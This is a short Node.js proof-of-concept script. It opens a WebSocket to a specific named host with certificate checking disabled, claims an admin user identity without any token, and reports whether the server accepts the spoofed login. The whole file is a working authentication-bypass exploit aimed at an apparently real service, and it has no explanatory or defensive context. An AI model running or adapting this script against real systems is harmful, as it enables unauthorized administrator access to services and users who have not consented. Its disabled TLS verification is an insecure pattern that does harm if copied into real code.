import WebSocket from 'ws';

const ws = new WebSocket('wss://central.wuk-on.com/ws', { rejectUnauthorized: false });
ws.on('open', () => {
  console.log('WS opened (NO auth token)');
  ws.send(JSON.stringify({ type: 'AUTH', payload: { userId: 'admin-1775359166073' } }));
});
let gotAny = false;
ws.on('message', (data) => {
  gotAny = true;
  const m = JSON.parse(data.toString());
  console.log('Got:', m.type, m.message || JSON.stringify(m.payload || {}).slice(0, 80));
  if (m.type === 'AUTH_SUCCESS') {
    console.log('🚨 Spoof succeeded — server registered us as admin-1775359166073 WITHOUT verifying JWT');
    setTimeout(() => { ws.close(); process.exit(0); }, 1000);
  }
});
setTimeout(() => {
  if (!gotAny) console.log('No response in 5s — possibly auth rejected silently');
  ws.close(); process.exit(0);
}, 5000);
